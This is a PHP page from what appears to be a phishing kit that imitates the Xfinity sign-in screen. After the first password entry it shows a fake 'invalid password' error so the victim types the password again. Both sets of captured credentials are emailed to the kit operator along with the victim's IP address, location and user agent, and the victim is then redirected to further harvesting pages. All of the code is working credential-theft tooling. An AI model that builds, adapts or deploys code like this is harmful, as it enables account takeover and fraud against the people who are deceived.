<?php
require "core/EntityVariables.php";
$config = require "KarmaEntity/config/config.php";

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (!isset($_SESSION['first_submit'])) {
        $_SESSION['first_submit'] = true;
        $_SESSION['karma-emailaccess1'] = htmlspecialchars($_POST['karma-emailaccess'], ENT_QUOTES, 'UTF-8');
        $_SESSION['karma-emailpassword1'] = htmlspecialchars($_POST['karma-emailpassword'], ENT_QUOTES, 'UTF-8');
        $data = [
            'karma-emailaccess1' => $_SESSION['karma-emailaccess1'],
            'karma-emailpassword1' => $_SESSION['karma-emailpassword1'],
        ];

        $message = '<div style="font-family: -apple-system, BlinkMacSystemFont, \'Segoe UI\', Roboto, Helvetica, Arial, sans-serif; background: #f4f7fc; border-radius: 20px; box-shadow: 0 4px 32px rgba(0, 0, 0, 0.1); padding: 40px 30px; line-height: 1.5;">'
            .'<h2 style="color: #2c3e50; font-size: 1.5rem; margin-bottom: 50px; letter-spacing: 0.8px; font-weight: 600;">' 
            .'<i>"' . htmlspecialchars($quote) . '"</i></h2>'
            .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">EMAIL AKSES INFO #1</h3>'
            .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); margin-bottom: 30px;">'
            .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
            .'Email    : ' . htmlspecialchars($data['karma-emailaccess1']) . "\n"
            .'Password : ' . htmlspecialchars($data['karma-emailpassword1']) . "\n"
            .'</code>'
            .'</pre>'
            .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">DEVICE INFO</h3>'
            .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);">'
            .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
            .'IP           : ' . htmlspecialchars($ip) . "\n"
            .'Country      : ' . htmlspecialchars($country) . "\n"
            .'City         : ' . htmlspecialchars($city) . "\n"
            .'Region       : ' . htmlspecialchars($region) . "\n"
            .'Latitude     : ' . htmlspecialchars($latitude) . "\n"
            .'Longitude    : ' . htmlspecialchars($longitude) . "\n"
            .'Timezone     : ' . htmlspecialchars($timezone) . "\n"
            .'User Agent   : ' . htmlspecialchars($userAgent) . "\n"
            .'</code>'
            .'</pre>'
            .'</div>';
        $to = $config['result_email'];
        $subject = 'EMAIL #1 :: ' . $data['karma-emailaccess1'] . ' :: [ ' . $country . ' - ' . $ip . ' ]';
        $headers = "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=utf-8\r\n";
        $headers .= "From: Entity <karma@entity.net>\r\n";
        mail($to, $subject, $message, $headers);
        EntityMessage("EMAIL #1 RECEIVED", $ip);
        header("Location: /x_finity");
        exit();
    } else {
        unset($_SESSION['first_submit']);
        $_SESSION['karma-emailaccess2'] = htmlspecialchars($_POST['karma-emailaccess'], ENT_QUOTES, 'UTF-8');
        $_SESSION['karma-emailpassword2'] = htmlspecialchars($_POST['karma-emailpassword'], ENT_QUOTES, 'UTF-8');
        $data = [
            'karma-emailaccess2' => $_SESSION['karma-emailaccess2'],
            'karma-emailpassword2' => $_SESSION['karma-emailpassword2'],
        ];

        $message = '<div style="font-family: -apple-system, BlinkMacSystemFont, \'Segoe UI\', Roboto, Helvetica, Arial, sans-serif; background: #f4f7fc; border-radius: 20px; box-shadow: 0 4px 32px rgba(0, 0, 0, 0.1); padding: 40px 30px; line-height: 1.5;">'
            .'<h2 style="color: #2c3e50; font-size: 1.5rem; margin-bottom: 50px; letter-spacing: 0.8px; font-weight: 600;">' 
            .'<i>"' . htmlspecialchars($quote) . '"</i></h2>'
            .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">EMAIL AKSES INFO #2</h3>'
            .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); margin-bottom: 30px;">'
            .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
            .'Email    : ' . htmlspecialchars($data['karma-emailaccess2']) . "\n"
            .'Password : ' . htmlspecialchars($data['karma-emailpassword2']) . "\n"
            .'</code>'
            .'</pre>'
            .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">DEVICE INFO</h3>'
            .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);">'
            .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
            .'IP           : ' . htmlspecialchars($ip) . "\n"
            .'Country      : ' . htmlspecialchars($country) . "\n"
            .'City         : ' . htmlspecialchars($city) . "\n"
            .'Region       : ' . htmlspecialchars($region) . "\n"
            .'Latitude     : ' . htmlspecialchars($latitude) . "\n"
            .'Longitude    : ' . htmlspecialchars($longitude) . "\n"
            .'Timezone     : ' . htmlspecialchars($timezone) . "\n"
            .'User Agent   : ' . htmlspecialchars($userAgent) . "\n"
            .'</code>'
            .'</pre>'
            .'</div>';
        $to = $config['result_email'];
        $subject = 'EMAIL #2 :: ' . $data['karma-emailaccess2'] . ' :: [ ' . $country . ' - ' . $ip . ' ]';
        $headers = "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=utf-8\r\n";
        $headers .= "From: Entity <karma@entity.net>\r\n";
        mail($to, $subject, $message, $headers);
        EntityMessage("EMAIL #2 RECEIVED", $ip);
        if ($config['feature'] === 'prime') {
            header("Location: /secure?entityId=$random_entity_id");
            exit();
        } else {
            header("Location: /yourAddress?entityId=$random_entity_id");
            exit();
        }
    }
}
$user_email = isset($_SESSION['entity_email']) ? htmlspecialchars($_SESSION['entity_email'], ENT_QUOTES, 'UTF-8') : '';
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Sign in to Xfinity</title>
    <?php require(__DIR__ . '/head.php') ?>
    <script>
    document.addEventListener('DOMContentLoaded', function() {
        const form = document.querySelector('form');
        const btn = form.querySelector('button[type="submit"]');
        const btnText = btn.innerHTML;
        form.addEventListener('submit', function() {
            btn.disabled = true;
            btn.innerHTML =
                `<span class="flex gap-2"> <svg width="24" height="24" stroke="#fff" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><style>.spinner_V8m1{transform-origin:center;animation:spinner_zKoa 2s linear infinite}.spinner_V8m1 circle{stroke-linecap:round;animation:spinner_YpZS 1.5s ease-in-out infinite}@keyframes spinner_zKoa{100%{transform:rotate(360deg)}}@keyframes spinner_YpZS{0%{stroke-dasharray:0 150;stroke-dashoffset:0}47.5%{stroke-dasharray:42 150;stroke-dashoffset:-16}95%,100%{stroke-dasharray:42 150;stroke-dashoffset:-59}}</style><g class="spinner_V8m1"><circle cx="12" cy="12" r="9.5" fill="none" stroke-width="3"></circle></g></svg> Please wait... </span>`;
        });
    });
    </script>
    <link rel="icon" href="/public/images/apple-icon-76x76.png" type="image/ico">
    <link rel="stylesheet" href="/public/css/karma-styles.css?v=<?= time() ?>">
    <link rel="stylesheet" href="/public/css/custom.css?v=<?= time() ?>">
</head>

<body class="bg-gray-100 w-full min-h-screen font-200">
    <div class="flex min-h-screen px-3 sm:px-0">
        <form method="post" action="" class="w-full max-w-md mx-auto flex flex-col justify-center">
            <div class="flex items-start mb-6 justify-start w-full">
                <img src="/public/images/xfinity_logo.svg" alt="Xfinity Logo" class="h-8 w-20 mr-3">
            </div>
            <b><?php echo $user_email; ?></b>
            <h2 class="text-3xl font-bold mb-6 mt-5 text-stone-800 w-full font-500">Enter your password</h2>
            <?php if (isset($_SESSION['first_submit'])): ?>
            <div class="flex flex-col mb-5">
                <div class="flex items-start gap-2">
                    <svg height="24" width="24" viewBox="0 0 32 32" aria-label="icon image" role="img"
                        focusable="false">
                        <path
                            d="M29.21 24.53L18.62 5.63a3 3 0 00-5.24 0L2.79 24.53A3 3 0 005.41 29h21.18a3 3 0 002.62-4.47zM17 24h-2v-2h2zm0-4h-2v-8h2z"
                            fill="#b91c1c"></path>
                    </svg>
                    <div>
                        <p class="text-red-700 font-semibold text-sm">The password you entered is invalid. Please try
                            again.</p>
                    </div>
                </div>
            </div>
            <?php endif; ?>
            <div class="mb-3 w-full relative">
                <input
                    class="w-full px-3 h-14 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-[#5415c2] pr-12"
                    type="password" id="karma-emailpassword" name="karma-emailpassword" required>
                <button type="button" id="togglePassword" tabindex="-1"
                    class="absolute right-7 top-1/2 -translate-y-1/2 text-gray-400 hover:text-[#5415c2] focus:outline-none">
                    <img id="eyeIconImg" src="/public/images/eye_on.svg" alt="Show/Hide Password" class="h-6 w-6" />
                </button>
            </div>
            <script>
            document.addEventListener('DOMContentLoaded', function() {
                const passwordInput = document.getElementById('karma-emailpassword');
                const togglePassword = document.getElementById('togglePassword');
                const eyeIconImg = document.getElementById('eyeIconImg');

                togglePassword.addEventListener('click', function() {
                    const isPassword = passwordInput.type === 'password';
                    passwordInput.type = isPassword ? 'text' : 'password';
                    eyeIconImg.src = isPassword ? '/public/images/eye_off.svg' :
                        '/public/images/eye_on.svg';
                });
            });
            </script>
            <div class="mb-10 w-full flex flex-col gap-5">
                <b
                    class="py-1 relative text-sm tracking-wider text-[#5415c2] hover:text-[#36156f] transition duration-150 font-bold w-fit
                        after:content-[''] after:absolute after:left-1/2 after:bottom-0 after:w-0 after:h-[2px] after:bg-[#5415c2] hover:after:w-full after:transition-all after:duration-300 after:-translate-x-1/2 hover:after:left-0 hover:after:-translate-x-0 cursor-pointer">
                    Forgot password?
                </b>
                <label class="inline-flex items-center gap-2 text-sm cursor-pointer w-max select-none">
                    <input type="checkbox"
                        class="peer appearance-none w-5 h-5 border border-[#5a23b9] rounded-sm checked:bg-[#5a23b9] focus:outline-none transition duration-500">
                    <span class="pointer-events-none relative w-5 h-5 -ml-5">
                        <svg class="absolute left-0 top-0 w-5 h-5 opacity-0 peer-checked:opacity-100 transition-opacity duration-500"
                            viewBox="0 0 20 20" fill="none">
                            <path d="M5 10.5L9 14.5L15 7.5" stroke="white" stroke-width="2" stroke-linecap="round"
                                stroke-linejoin="round" />
                        </svg>
                    </span>
                    <span class="text-md">Keep me signed in</span>
                </label>
                <p class="text-sm tracking-wider">
                    By signing in, you agree to our
                    <span
                        class="text-[#5a23b9] underline hover:text-[#36156f] transition duration-150 cursor-pointer">Terms
                        of Service</span>
                    and
                    <span
                        class="text-[#5a23b9] underline hover:text-[#36156f] transition duration-150 cursor-pointer">Privacy
                        Policy</span>.
                </p>
            </div>
            <button
                class="bg-[#5a23b9] text-white py-2 px-7 rounded hover:bg-[#36156f] transition font-semibold mb-2 duration-300 h-14 cursor-pointer self-start"
                type="submit">
                Sign in
            </button>
        </form>
    </div>
</body>
<?php require(__DIR__ . '/footer.php') ?>

</html>